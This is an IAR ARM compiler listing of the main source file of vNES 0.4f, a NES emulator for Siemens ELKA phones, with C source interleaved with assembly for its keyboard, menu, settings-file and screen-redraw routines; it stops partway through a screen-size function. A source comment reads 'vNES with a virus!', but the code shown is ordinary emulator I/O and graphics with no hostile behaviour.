##############################################################################
#                                                                            #
# IAR ARM ANSI C/C++ Compiler V4.42A/W32 EVALUATION    09/Dec/2010  18:20:56 #
# Copyright 1999-2005 IAR Systems. All rights reserved.                      #
#                                                                            #
#    Cpu mode        =  interwork                                            #
#    Endian          =  little                                               #
#    Stack alignment =  4                                                    #
#    Source file     =  C:\arm\vNes_sound\MAIN.C                             #
#    Command line    =  C:\arm\vNes_sound\MAIN.C -D NDEBUG -D NEWSGOLD -D    #
#                       ELKA -lCN C:\arm\vNes_sound\release_ELKA\List\ -lA   #
#                       C:\arm\vNes_sound\release_ELKA\List\ -o              #
#                       C:\arm\vNes_sound\release_ELKA\Obj\ -s9 --cpu_mode   #
#                       arm --endian little --cpu ARM926EJ-S --stack_align   #
#                       4 --interwork -e --fpu None --dlib_config            #
#                       "C:\arm2\Embedded Workbench 4.0                      #
#                       Evaluation\ARM\LIB\dl5tpainl8f.h" -I                 #
#                       "C:\arm2\Embedded Workbench 4.0                      #
#                       Evaluation\ARM\INC\" --inline_threshold=2            #
#    List file       =  C:\arm\vNes_sound\release_ELKA\List\MAIN.lst         #
#    Object file     =  C:\arm\vNes_sound\release_ELKA\Obj\MAIN.r79          #
#                                                                            #
#                                                                            #
##############################################################################

C:\arm\vNes_sound\MAIN.C
      1          
      2          // vNES с вирусом!
      3          
      4          #include "menu.h"

   \                                 In segment DATA_I, align 4, align-sorted
   \   char __data zfont[769]
   \                     zfont:
   \   00000000                      DS8 772
   \   00000304                      REQUIRE `?<Initializer for zfont>`

   \                                 In segment DATA_Z, align 4, align-sorted
   \   char *__data file
   \                     file:
   \   00000000                      DS8 4

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void keyboard_init()
   \                     keyboard_init:
   \   00000000   10402DE9           PUSH     {R4,LR}
   \   00000004   ........           LDR      R4,??DataTable49  ;; param
   \   00000008   2020A0E3           MOV      R2,#+32
   \   0000000C   0010A0E3           MOV      R1,#+0
   \   00000010   800084E2           ADD      R0,R4,#+128
   \   00000014   BB0000EF           SWI      +187
   \   00000018   2020A0E3           MOV      R2,#+32
   \   0000001C   0010A0E3           MOV      R1,#+0
   \   00000020   E00084E2           ADD      R0,R4,#+224
   \   00000024   BB0000EF           SWI      +187
   \   00000028   1080BDE8           POP      {R4,PC}          ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void drawsym(short *, char)
   \                     drawsym:
   \   00000000   70209FE5           LDR      R2,??drawsym_0   ;; zfont
   \   00000004   30002DE9           PUSH     {R4,R5}
   \   00000008   E01081E2           ADD      R1,R1,#+224
   \   0000000C   011CB0E1           LSLS     R1,R1,#+24
   \   00000010   0010A003           MOVEQ    R1,#+0
   \   00000014   A11AA011           LSRNE    R1,R1,#+21
   \   00000018   021081E0           ADD      R1,R1,R2
   \   0000001C   0020A0E3           MOV      R2,#+0
   \                     ??drawsym_1:
   \   00000020   ........           LDRB     R3,[R1], #+1
   \   00000024   00C0A0E3           MOV      R12,#+0
   \                     ??drawsym_2:
   \   00000028   0040A0E1           MOV      R4,R0
   \   0000002C   020084E2           ADD      R0,R4,#+2
   \   00000030   800013E3           TST      R3,#0x80
   \   00000034   0050E013           MVNNE    R5,#+0
   \   00000038   1F50A003           MOVEQ    R5,#+31
   \   0000003C   B050C4E1           STRH     R5,[R4, #+0]
   \   00000040   833CA0E1           LSL      R3,R3,#+25
   \   00000044   233CA0E1           LSR      R3,R3,#+24
   \   00000048   01C08CE2           ADD      R12,R12,#+1
   \   0000004C   08005CE3           CMP      R12,#+8
   \   00000050   F4FFFFBA           BLT      ??drawsym_2
   \   00000054   ........           LDR      R3,??DataTable41  ;; width
   \   00000058   012082E2           ADD      R2,R2,#+1
   \   0000005C   003093E5           LDR      R3,[R3, #+0]
   \   00000060   080052E3           CMP      R2,#+8
   \   00000064   830080E0           ADD      R0,R0,R3, LSL #+1
   \   00000068   100040E2           SUB      R0,R0,#+16
   \   0000006C   EBFFFFBA           BLT      ??drawsym_1
   \   00000070   3000BDE8           POP      {R4,R5}
   \   00000074   1EFF2FE1           BX       LR               ;; return
   \                     ??drawsym_0:
   \   00000078   ........           DC32     zfont

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void drawhelp(char const *)
   \                     drawhelp:
   \   00000000   70402DE9           PUSH     {R4-R6,LR}
   \   00000004   0040A0E3           MOV      R4,#+0
   \   00000008   0050A0E3           MOV      R5,#+0
   \   0000000C   0460A0E1           MOV      R6,R4
   \   00000010   ........           BL       outmenu
   \   00000014   090000EA           B        ??drawhelp_0
   \                     ??drawhelp_1:
   \   00000018   ........           LDR      R3,??DataTable38  ;; screen
   \   0000001C   960000E0           MUL      R0,R6,R0
   \   00000020   003093E5           LDR      R3,[R3, #+0]
   \   00000024   1420A0E3           MOV      R2,#+20
   \   00000028   053283E0           ADD      R3,R3,R5, LSL #+4
   \   0000002C   923020E0           MLA      R0,R2,R0,R3
   \   00000030   015085E2           ADD      R5,R5,#+1
   \   00000034   080080E2           ADD      R0,R0,#+8
   \   00000038   ........           BL       drawsym
   \   0000003C   014084E2           ADD      R4,R4,#+1
   \                     ??drawhelp_0:
   \   00000040   58009FE5           LDR      R0,??drawhelp_2  ;; param
   \   00000044   000084E0           ADD      R0,R4,R0
   \   00000048   1811D0E5           LDRB     R1,[R0, #+280]
   \   0000004C   000051E3           CMP      R1,#+0
   \   00000050   7080BD08           POPEQ    {R4-R6,PC}
   \   00000054   ........           LDR      R0,??DataTable41  ;; width
   \   00000058   0A0051E3           CMP      R1,#+10
   \   0000005C   000090E5           LDR      R0,[R0, #+0]
   \   00000060   0300000A           BEQ      ??drawhelp_3
   \   00000064   4021A0E1           ASR      R2,R0,#+2
   \   00000068   A22E80E0           ADD      R2,R0,R2, LSR #+29
   \   0000006C   C20155E1           CMP      R5,R2, ASR #+3
   \   00000070   010000BA           BLT      ??drawhelp_4
   \                     ??drawhelp_3:
   \   00000074   0050A0E3           MOV      R5,#+0
   \   00000078   016086E2           ADD      R6,R6,#+1
   \                     ??drawhelp_4:
   \   0000007C   ........           LDR      R2,??DataTable42  ;; height
   \   00000080   1C309FE5           LDR      R3,??drawhelp_2+0x4  ;; 0x66666667
   \   00000084   002092E5           LDR      R2,[R2, #+0]
   \   00000088   93C2CEE0           SMULL    R12,LR,R3,R2
   \   0000008C   4EE1A0E1           ASR      LR,LR,#+2
   \   00000090   A22F8EE0           ADD      R2,LR,R2, LSR #+31
   \   00000094   020056E1           CMP      R6,R2
   \   00000098   DEFFFFBA           BLT      ??drawhelp_1
   \   0000009C   7080BDE8           POP      {R4-R6,PC}       ;; return
   \                     ??drawhelp_2:
   \   000000A0   ........           DC32     param
   \   000000A4   67666666           DC32     0x66666667

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs int loadini()
   \                     loadini:
   \   00000000   70402DE9           PUSH     {R4-R6,LR}
   \   00000004   ........           LDR      R4,??DataTable49  ;; param
   \   00000008   04D04DE2           SUB      SP,SP,#+4
   \   0000000C   2650A0E3           MOV      R5,#+38
   \   00000010   0050C4E5           STRB     R5,[R4, #+0]
   \   00000014   866FA0E3           MOV      R6,#+536
   \   00000018   2E10A0E3           MOV      R1,#+46
   \   0000001C   040086E0           ADD      R0,R6,R4
   \   00000020   170100EF           SWI      +279
   \   00000024   ........           LDR      R1,??DataTable8  ;; `?<Constant ".ini">`
   \   00000028   1A0000EF           SWI      +26
   \   0000002C   0D30A0E1           MOV      R3,SP
   \   00000030   8020A0E3           MOV      R2,#+128
   \   00000034   801CA0E3           MOV      R1,#+32768
   \   00000038   040086E0           ADD      R0,R6,R4
   \   0000003C   0A0000EF           SWI      +10
   \   00000040   0060A0E1           MOV      R6,R0
   \   00000044   010076E3           CMN      R6,#+1
   \   00000048   0F00000A           BEQ      ??loadini_0
   \   0000004C   0D30A0E1           MOV      R3,SP
   \   00000050   0120A0E3           MOV      R2,#+1
   \   00000054   0410A0E1           MOV      R1,R4
   \   00000058   0B0000EF           SWI      +11
   \   0000005C   0000D4E5           LDRB     R0,[R4, #+0]
   \   00000060   260050E3           CMP      R0,#+38
   \   00000064   0050C415           STRBNE   R5,[R4, #+0]
   \   00000068   0400001A           BNE      ??loadini_1
   \   0000006C   0D30A0E1           MOV      R3,SP
   \   00000070   FF20A0E3           MOV      R2,#+255
   \   00000074   011084E2           ADD      R1,R4,#+1
   \   00000078   0600A0E1           MOV      R0,R6
   \   0000007C   0B0000EF           SWI      +11
   \                     ??loadini_1:
   \   00000080   0D10A0E1           MOV      R1,SP
   \   00000084   0600A0E1           MOV      R0,R6
   \   00000088   0D0000EF           SWI      +13
   \                     ??loadini_0:
   \   0000008C   ........           BL       keyboard_init
   \   00000090   0000A0E3           MOV      R0,#+0
   \   00000094   7280BDE8           POP      {R1,R4-R6,PC}    ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs int saveini()
   \                     saveini:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   ........           LDR      R5,??DataTable49  ;; param
   \   00000008   04D04DE2           SUB      SP,SP,#+4
   \   0000000C   864FA0E3           MOV      R4,#+536
   \   00000010   2E10A0E3           MOV      R1,#+46
   \   00000014   050084E0           ADD      R0,R4,R5
   \   00000018   170100EF           SWI      +279
   \   0000001C   ........           LDR      R1,??DataTable8  ;; `?<Constant ".ini">`
   \   00000020   1A0000EF           SWI      +26
   \   00000024   0D30A0E1           MOV      R3,SP
   \   00000028   402FA0E3           MOV      R2,#+256
   \   0000002C   0110A0E3           MOV      R1,#+1
   \   00000030   831C81E3           ORR      R1,R1,#0x8300
   \   00000034   050084E0           ADD      R0,R4,R5
   \   00000038   0A0000EF           SWI      +10
   \   0000003C   0040A0E1           MOV      R4,R0
   \   00000040   010074E3           CMN      R4,#+1
   \   00000044   0100A003           MOVEQ    R0,#+1
   \   00000048   3280BD08           POPEQ    {R1,R4,R5,PC}
   \   0000004C   ........           BL       keyboard_init
   \   00000050   0D30A0E1           MOV      R3,SP
   \   00000054   402FA0E3           MOV      R2,#+256
   \   00000058   0510A0E1           MOV      R1,R5
   \   0000005C   0400A0E1           MOV      R0,R4
   \   00000060   0C0000EF           SWI      +12
   \   00000064   0D10A0E1           MOV      R1,SP
   \   00000068   0400A0E1           MOV      R0,R4
   \   0000006C   0D0000EF           SWI      +13
   \   00000070   0000A0E3           MOV      R0,#+0
   \   00000074   3280BDE8           POP      {R1,R4,R5,PC}    ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs int isFreeRam(char *, char *)
   \                     isFreeRam:
   \   00000000   ........           LDR      R0,??DataTable51  ;; EL71
   \   00000004   0000D0E5           LDRB     R0,[R0, #+0]
   \   00000008   000050E3           CMP      R0,#+0
   \   0000000C   0100A003           MOVEQ    R0,#+1
   \   00000010   1EFF2F01           BXEQ     LR
   \   00000014   0000A0E3           MOV      R0,#+0
   \   00000018   1EFF2FE1           BX       LR               ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void keypress(unsigned char, int)
   \                     keypress:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   ........           LDR      R4,??DataTable49  ;; param
   \   00000008   0150A0E1           MOV      R5,R1
   \   0000000C   0210D4E5           LDRB     R1,[R4, #+2]
   \   00000010   000051E3           CMP      R1,#+0
   \   00000014   A010A013           MOVNE    R1,#+160
   \   00000018   4010A003           MOVEQ    R1,#+64
   \   0000001C   042081E0           ADD      R2,R1,R4
   \   00000020   0010A0E1           MOV      R1,R0
   \   00000024   0200A0E1           MOV      R0,R2
   \   00000028   180000EF           SWI      +24
   \   0000002C   000050E3           CMP      R0,#+0
   \   00000030   3080BD08           POPEQ    {R4,R5,PC}
   \   00000034   101194E5           LDR      R1,[R4, #+272]
   \   00000038   2020D0E5           LDRB     R2,[R0, #+32]
   \   0000003C   000055E3           CMP      R5,#+0
   \   00000040   0300000A           BEQ      ??keypress_0
   \   00000044   011082E1           ORR      R1,R2,R1
   \   00000048   101184E5           STR      R1,[R4, #+272]
   \   0000004C   0110A0E3           MOV      R1,#+1
   \   00000050   020000EA           B        ??keypress_1
   \                     ??keypress_0:
   \   00000054   0210C1E1           BIC      R1,R1,R2
   \   00000058   101184E5           STR      R1,[R4, #+272]
   \   0000005C   0010A0E3           MOV      R1,#+0
   \                     ??keypress_1:
   \   00000060   4010C0E5           STRB     R1,[R0, #+64]
   \   00000064   3080BDE8           POP      {R4,R5,PC}       ;; return

   \                                 In segment DATA_Z, align 4, align-sorted
      5          int plus=0;
   \                     plus:
   \   00000000                      DS8 4
      6          extern void AudioTerminate();
      7          extern void AudioInit();
      8          extern void AudioStart();
      9          extern void NSF_Init();
     10          extern signed char Volume;
     11          
     12          
     13          extern int screensize;
     14          
     15          extern unsigned short *screens;
     16          extern char d_boolean_static_fld; //save_flag
     17          extern char o_boolean_static_fld; //load flag (to romname)
     18          extern char v_boolean_static_fld;
     19          
     20          extern void freeall();
     21          extern void initnul();
     22          extern char loadrom(char *s) ;
     23          extern void run();
     24          extern unsigned char SGOLD2, C65, S75, EL71;
     25          extern int getWidth, getHeight, screen_length;
     26          
     27          extern int b_int_static_fld, L;
     28          extern int B; //масштаб???

   \                                 In segment DATA_Z, align 4, align-sorted
     29          long LastTmrVal;
   \                     LastTmrVal:
   \   00000000                      DS8 4
     30          const byte version=0x26;
     31          int tmpsize;
     32          extern int A; //frameskip=5
     33          //extern int k_int_static_fld; //joy from vNES
     34          //#define joy k_int_static_fld
     35          

   \                                 In segment CODE, align 4, keep-with-next
     36          void repaint(){
   \                     repaint:
   \   00000000   00402DE9           PUSH     {LR}
     37            
     38             //if((SysTimer()-LastTmrVal)<=(A*10))
     39                                      //{
     40                                                     REDRAW();  
   \   00000004   720100EF           SWI      +370
     41                                                    // LastTmrVal=LastTmrVal+40-A*10;  
     42                                      //}
     43                                      
     44                                      //LastTmrVal=LastTmrVal+A*10;  
     45            
     46              ;}
   \   00000008   0080BDE8           POP      {PC}             ;; return

   \                                 In segment DATA_C, align 4, align-sorted
   \   char const __data helpsel[12]
   \                     helpsel:
   \   00000000   2053656C6563       DC8 " Select key"
   \              74206B657900
     47          
     48          const char helpkey[]=" 1 A\n2 up\n3 B\n4 left\n5 start\n6 right\n7 AA\n8 down\n9 BB\n0 select\n* AB";
   \                     helpkey:
   \   0000000C   203120410A32       DC8 20H, 31H, 20H, 41H, 0AH, 32H, 20H, 75H
   \              2075        
   \   00000014   700A3320420A       DC8 70H, 0AH, 33H, 20H, 42H, 0AH, 34H, 20H
   \              3420        
   \   0000001C   6C6566740A35       DC8 6CH, 65H, 66H, 74H, 0AH, 35H, 20H, 73H
   \              2073        
   \   00000024   746172740A36       DC8 74H, 61H, 72H, 74H, 0AH, 36H, 20H, 72H
   \              2072        
   \   0000002C   696768740A37       DC8 69H, 67H, 68H, 74H, 0AH, 37H, 20H, 41H
   \              2041        
   \   00000034   410A3820646F       DC8 41H, 0AH, 38H, 20H, 64H, 6FH, 77H, 6EH
   \              776E        
   \   0000003C   0A392042420A       DC8 0AH, 39H, 20H, 42H, 42H, 0AH, 30H, 20H
   \              3020        
   \   00000044   73656C656374       DC8 73H, 65H, 6CH, 65H, 63H, 74H, 0AH, 2AH
   \              0A2A        
   \   0000004C   20414200           DC8 20H, 41H, 42H, 0

   \                                 In segment DATA_C, align 1, align-sorted
   \                     version:
   \   00000000   26                 DC8 38

   \                                 In segment DATA_I, align 4, align-sorted
     49          extern char t_boolean_static_fld;
     50          
     51          extern void DrawScreen(); // Функция перерисовки экрана
     52          void onredraw();
     53          
     54          char *Title="vNES 0.4f (c)bn";
     55          
     56          const char *errors[]={
     57            0,
     58            "Запустите .nes файл\0",
     59            "Unknown error\0",
     60            "Не могу открыть файл\0",
     61            "Не .Nes ром!\0",
     62            "Маппер не поддерживается.\0",
     63            "Неверный ром!\0"
     64          };
     65          
     66          char romname[256];
     67          byte param[paramlength]=
   \                     param:
   \   00000000                      DS8 256
   \   00000100                      REQUIRE `?<Initializer for param>`
   \   int __data mode
   \                     mode:
   \   00000100                      DS8 4
   \   00000104                      REQUIRE `?<Initializer for mode>`
   \   int volatile __data running
   \                     running:
   \   00000104                      DS8 4
   \   00000108                      REQUIRE `?<Initializer for running>`
   \   int volatile __data exit
   \                     exit:
   \   00000108                      DS8 4
   \   0000010C                      REQUIRE `?<Initializer for exit>`
   \   byte *__data redefineptr
   \                     redefineptr:
   \   0000010C                      DS8 4
   \   00000110                      REQUIRE `?<Initializer for redefineptr>`
   \   int __data joy
   \                     joy:
   \   00000110                      DS8 4
   \   00000114                      REQUIRE `?<Initializer for joy>`
   \                     tmpsize:
   \   00000114                      DS8 4
   \   00000118                      REQUIRE `?<Initializer for tmpsize>`
   \   char __data menu[256]
   \                     menu:
   \   00000118                      DS8 256
   \   00000218                      REQUIRE `?<Initializer for menu>`
   \   char __data filename[128]
   \                     filename:
   \   00000218                      DS8 128
   \   00000298                      REQUIRE `?<Initializer for filename>`
   \                     romname:
   \   00000298                      DS8 256
   \   00000398                      REQUIRE `?<Initializer for romname>`
     68          "\x26\x05\x00\x00\x00\x00\x84\xB0\x00\x00\x08\x00\x00\x00\x00\x00"
     69          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     70          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     71          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     72          "\x3D\x3E\x3B\x3C\x2A\x23\x34\x36\x32\x38\x35\x1A\x31\x33\x37\x39"
     73          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     74          "\x40\x80\x10\x20\x10\x20\x40\x80\x10\x20\x08\x01\x08\x04\x01\x02"
     75          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     76          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     77          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     78          "\x3D\x3E\x3B\x3C\x2A\x23\x34\x36\x32\x38\x35\x1A\x31\x33\x37\x39"
     79          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     80          "\x40\x80\x10\x20\x10\x20\x40\x80\x10\x20\x08\x01\x08\x04\x01\x02"
     81          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     82          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     83          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
     84          
     85          enum{ pwidth=6, pheight, poptimize, pfilter, pstep, screenx, screeny};
     86          
     87          char help[]=
   \                     help:
   \   00000398                      DS8 168
   \   00000440                      REQUIRE `?<Initializer for help>`

   \                                 In segment DATA_I, align 4, align-sorted
   \                     Title:
   \   00000000                      DS8 4
   \   00000004                      REQUIRE `?<Initializer for Title>`

   \                                 In segment DATA_I, align 4, align-sorted
   \                     errors:
   \   00000000                      DS8 28
   \   0000001C                      REQUIRE `?<Initializer for errors>`
     88          " vNES 0.4f (c)bn"
     89          "\n1.Load 0-9"
     90          "\n2.Save 0-9"
     91          "\n3.FrmSkp 1-9:%d"
     92          "\n4.Optimize:%d"
     93          "\n5.Redefine"
     94          "\n6.Quality:%d"
     95          "\n7.ScrStep:%02d"
     96          "\n8.SizeX:%03d"
     97          "\n9.SizeY:%03d"
     98          "\n0.Exit"
     99          "\ncbn.narod.ru"
    100          "\ncbn@yandex.ru";
    101          
    102          

   \                                 In segment CODE, align 4, keep-with-next
    103          void outmenu(const char *help){
    104            sprintf(menu,help,param[pframeskip],t_boolean_static_fld,param[pfilter],param[pstep],getWidth, getHeight);//,param[pslow]);//,buf[stwidth],buf[stheight],buf[speed],buf[free],buf[fill],buf[lorec]|(buf[hirec]<<8));
   \                     outmenu:
   \   00000000   ........           LDR      R2,??DataTable46  ;; getHeight
   \   00000004   00402DE9           PUSH     {LR}
   \   00000008   002092E5           LDR      R2,[R2, #+0]
   \   0000000C   0010A0E1           MOV      R1,R0
   \   00000010   ........           LDR      R0,??DataTable49  ;; param
   \   00000014   04002DE9           PUSH     {R2}
   \   00000018   ........           LDR      R2,??DataTable45  ;; getWidth
   \   0000001C   002092E5           LDR      R2,[R2, #+0]
   \   00000020   04002DE9           PUSH     {R2}
   \   00000024   0A20D0E5           LDRB     R2,[R0, #+10]
   \   00000028   04002DE9           PUSH     {R2}
   \   0000002C   0920D0E5           LDRB     R2,[R0, #+9]
   \   00000030   04002DE9           PUSH     {R2}
   \   00000034   ........           LDR      R2,??DataTable53  ;; t_boolean_static_fld
   \   00000038   0030D2E5           LDRB     R3,[R2, #+0]
   \   0000003C   0120D0E5           LDRB     R2,[R0, #+1]
   \   00000040   460F80E2           ADD      R0,R0,#+280
   \   00000044   160000EF           SWI      +22
    105          }
   \   00000048   0F80BDE8           POP      {R0-R3,PC}       ;; return
    106          
    107          //void redEL(){
    108          //  int i,j,k;
    109          //  int r,g,b;
    110          //  short *ss=screen;
    111          //  int *s=screens;//main_a_...
    112          //  for(j=0;j<240*240;j++){
    113          ////    for(i=0;i<240;i++){
    114          //      k=*s++;
    115          //      *ss++=((k&0xf80000)>>8)|((k&0xfc00)>>5)|((k&0xf8)>>3);
    116          ////    }
    117          //  }
    118          //}
    119          
    120          //int screenx=0, screeny=0;
    121          

   \                                 In segment CODE, align 4, keep-with-next
    122          void onredslow(){
    123            int j,k,l;
    124            short *s, *ss;
    125            cls();
   \                     onredslow:
   \   00000000   ........           LDR      R0,??DataTable37  ;; screensize
   \   00000004   F0472DE9           PUSH     {R4-R10,LR}
   \   00000008   ........           LDR      R4,??DataTable38  ;; screen
   \   0000000C   000090E5           LDR      R0,[R0, #+0]
    126            if(l=(((C65?130:height)-getHeight)>>1)<0) l=0;
    127            if(k=((width-getWidth)>>1)<0) k=0;
    128            ss=screen+l*width+k;
    129              l=(getWidth>width)?width:getWidth;
   \   00000010   ........           LDR      R5,??DataTable45  ;; getWidth
   \   00000014   4021A0E1           ASR      R2,R0,#+2
   \   00000018   000094E5           LDR      R0,[R4, #+0]
   \   0000001C   ........           LDR      R6,??DataTable41  ;; width
   \   00000020   0010A0E3           MOV      R1,#+0
   \   00000024   ........           _BLF     memsetd,??memsetd??rA
    130              k=(getHeight>height)?height:getHeight;
   \   00000028   ........           LDR      R0,??DataTable46  ;; getHeight
   \   0000002C   001095E5           LDR      R1,[R5, #+0]
   \   00000030   008090E5           LDR      R8,[R0, #+0]
   \   00000034   ........           LDR      R0,??DataTable42  ;; height
   \   00000038   007096E5           LDR      R7,[R6, #+0]
   \   0000003C   000090E5           LDR      R0,[R0, #+0]
   \   00000040   004094E5           LDR      R4,[R4, #+0]
   \   00000044   010057E1           CMP      R7,R1
   \   00000048   0170A0A1           MOVGE    R7,R1
   \   0000004C   080050E1           CMP      R0,R8
   \   00000050   0080A0B1           MOVLT    R8,R0
    131              s=(short*)screens+param[screenx]+param[screeny]*getWidth;
   \   00000054   ........           LDR      R0,??DataTable49  ;; param
    132              for(j=0;j<k;j++){
   \   00000058   00A0A0E3           MOV      R10,#+0
   \   0000005C   0C20D0E5           LDRB     R2,[R0, #+12]
   \   00000060   0B00D0E5           LDRB     R0,[R0, #+11]
   \   00000064   010058E3           CMP      R8,#+1
   \   00000068   910202E0           MUL      R2,R1,R2
   \   0000006C   ........           LDR      R1,??DataTable24  ;; screens
   \   00000070   001091E5           LDR      R1,[R1, #+0]
   \   00000074   800081E0           ADD      R0,R1,R0, LSL #+1
   \   00000078   829080E0           ADD      R9,R0,R2, LSL #+1
   \   0000007C   090000AA           BGE      ??onredslow_0
   \   00000080   F087BDE8           POP      {R4-R10,PC}
    133                movsw(ss,s,l);
   \                     ??onredslow_1:
   \   00000084   0720A0E1           MOV      R2,R7
   \   00000088   0910A0E1           MOV      R1,R9
   \   0000008C   0400A0E1           MOV      R0,R4
   \   00000090   ........           _BLF     movsw,??movsw??rA
    134                ss+=width;
   \   00000094   000096E5           LDR      R0,[R6, #+0]
    135                s+=getWidth;
    136              }
   \   00000098   01A08AE2           ADD      R10,R10,#+1
   \   0000009C   804084E0           ADD      R4,R4,R0, LSL #+1
   \   000000A0   000095E5           LDR      R0,[R5, #+0]
   \   000000A4   809089E0           ADD      R9,R9,R0, LSL #+1
   \                     ??onredslow_0:
   \   000000A8   08005AE1           CMP      R10,R8
   \   000000AC   F4FFFFBA           BLT      ??onredslow_1
    137          }
   \   000000B0   F087BDE8           POP      {R4-R10,PC}      ;; return
    138          
    139          extern void filter2(void *to, void *from);
    140          extern void filter(void *to, void *from);
    141          

   \                                 In segment CODE, align 4, keep-with-next
    142          void onredraw(){ // Перерисовка экрана screen[132*176]
    143            if(param[pfilter] && !EL71){ if(C65) filter(screen,screens); else filter2(screen,screens);//!!!!!2
   \                     onredraw:
   \   00000000   ........           LDR      R0,??DataTable38  ;; screen
   \   00000004   ........           LDR      R1,??DataTable24  ;; screens
   \   00000008   ........           LDR      R2,??DataTable51  ;; EL71
   \   0000000C   10402DE9           PUSH     {R4,LR}
   \   00000010   000090E5           LDR      R0,[R0, #+0]
   \   00000014   001091E5           LDR      R1,[R1, #+0]
   \   00000018   ........           LDR      R4,??DataTable49  ;; param
   \   0000001C   0020D2E5           LDRB     R2,[R2, #+0]
   \   00000020   0930D4E5           LDRB     R3,[R4, #+9]
   \   00000024   000053E3           CMP      R3,#+0
   \   00000028   0900000A           BEQ      ??onredraw_0
   \   0000002C   000052E3           CMP      R2,#+0
   \   00000030   0700001A           BNE      ??onredraw_0
   \   00000034   ........           LDR      R2,??DataTable50  ;; C65
   \   00000038   0020D2E5           LDRB     R2,[R2, #+0]
   \   0000003C   000052E3           CMP      R2,#+0
   \   00000040   0100000A           BEQ      ??onredraw_1
   \   00000044   ........           _BLF     filter,??filter??rA
   \   00000048   150000EA           B        ??onredraw_2
   \                     ??onredraw_1:
   \   0000004C   ........           _BLF     filter2,??filter2??rA
   \   00000050   130000EA           B        ??onredraw_2
    144            }else
    145            if(getWidth==width && getHeight==height)
   \                     ??onredraw_0:
   \   00000054   ........           LDR      R3,??DataTable45  ;; getWidth
   \   00000058   ........           LDR      R12,??DataTable41  ;; width
   \   0000005C   003093E5           LDR      R3,[R3, #+0]
   \   00000060   00C09CE5           LDR      R12,[R12, #+0]
   \   00000064   0C0053E1           CMP      R3,R12
   \   00000068   0C00001A           BNE      ??onredraw_3
   \   0000006C   ........           LDR      R3,??DataTable46  ;; getHeight
   \   00000070   ........           LDR      R12,??DataTable42  ;; height
   \   00000074   003093E5           LDR      R3,[R3, #+0]
   \   00000078   00C09CE5           LDR      R12,[R12, #+0]
   \   0000007C   0C0053E1           CMP      R3,R12
   \   00000080   0600001A           BNE      ??onredraw_3
    146              movsd(screen,screens,EL71?(255*240/2):(132*176/2));
   \   00000084   000052E3           CMP      R2,#+0
   \   00000088   8820A013           MOVNE    R2,#+136
   \   0000008C   772C8213           ORRNE    R2,R2,#0x7700
   \   00000090   6020A003           MOVEQ    R2,#+96
   \   00000094   B42D8203           ORREQ    R2,R2,#0x2D00
   \   00000098   ........           _BLF     movsd,??movsd??rA
   \   0000009C   000000EA           B        ??onredraw_2
    147            else onredslow();
   \                     ??onredraw_3:
   \   000000A0   ........           BL       onredslow
    148            if(mode) drawhelp((mode==99)?helpsel:((mode==98)?helpkey:help));
   \                     ??onredraw_2:
   \   000000A4   001194E5           LDR      R1,[R4, #+256]
   \   000000A8   000051E3           CMP      R1,#+0
   \   000000AC   1080BD08           POPEQ    {R4,PC}
   \   000000B0   18009FE5           LDR      R0,??onredraw_4  ;; helpsel
   \   000000B4   630051E3           CMP      R1,#+99
   \   000000B8   0200000A           BEQ      ??onredraw_5
   \   000000BC   620051E3           CMP      R1,#+98
   \   000000C0   0C008002           ADDEQ    R0,R0,#+12
   \   000000C4   E60F8412           ADDNE    R0,R4,#+920
   \                     ??onredraw_5:
   \   000000C8   ........           BL       drawhelp
    149          }
   \   000000CC   1080BDE8           POP      {R4,PC}          ;; return
   \                     ??onredraw_4:
   \   000000D0   ........           DC32     helpsel
    150            //  extern void redraw(short *screen, int *from, int size);
    151          //  extern void filter(short *screen, int *from);
    152          // if(!c65) 
    153          //  redraw(screen, screens, (EL71)?(240*240):(132*176));
    154          // else  filter(screen, screens);
    155          /*  int i,j,k;
    156            int r,g,b;
    157            short *ss=screen;
    158            int *s=screens;//main_a_...
    159            for(j=0;j<176;j++){
    160              for(i=0;i<132;i++){
    161                k=*s++;
    162                //r=(k>>16)&0xff;
    163                //g=(k>>8)&0xff;
    164                //b=(k)&0xff;
    165                *ss++=((k&0xf80000)>>8)|((k&0xfc00)>>5)|((k&0xf8)>>3);
    166                  //(r>>3<<11)|(g>>2<<5)|(b>>3);
    167              }
    168              //s+=256-132;
    169            }
    170          */
    171          //  int i,j;
    172          //  for(i=0,j=color++;i<132*176;i++){
    173          //    screen[i]=j++;
    174          //  }
    175          //}
    176          

   \                                 In segment CODE, align 4, keep-with-next
    177          void getscrXY(){ //помен. размеры экрана max 256 240
    178            //int x,y;
    179          //  if(param[protate]){ x=height; y=width;}
    180            //else {}
    181            //x=width; y=height;
    182            if(!(getWidth=param[pwidth])) getWidth=256;
   \                     getscrXY:
   \   00000000   ........           LDR      R0,??DataTable49  ;; param
   \   00000004   30402DE9           PUSH     {R4,R5,LR}
